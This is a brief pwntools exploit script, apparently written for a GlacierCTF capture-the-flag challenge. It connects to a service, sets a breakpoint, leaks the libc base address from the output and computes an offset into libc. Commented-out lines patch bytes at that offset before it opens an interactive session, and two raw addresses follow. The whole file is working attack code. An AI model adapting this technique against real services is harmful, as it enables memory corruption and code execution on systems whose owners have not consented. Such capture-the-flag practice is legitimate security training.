from pwn import *

#p = remote('challs.glacierctf.com', 13377)
p = remote('localhost', 1337)

p.sendline(b'b *main+629')
# p.sendline(b'b __run_exit_handlers')
p.sendline(b'r')

libc_address = int((p.recvline_contains(b'libc.so.6')).decode().split('-')[0], 16)

print('libc     @', hex(libc_address))

offset = libc_address + 0x47a21
print('offset   @', hex(offset))

# p.sendline(hex(offset + 1).encode())
# p.sendline(b'5')

# p.sendline(hex(offset + 2).encode())
# p.sendline(b'7b')

p.interactive()

0x7ffff7c47a21
0x7ffff7cef52b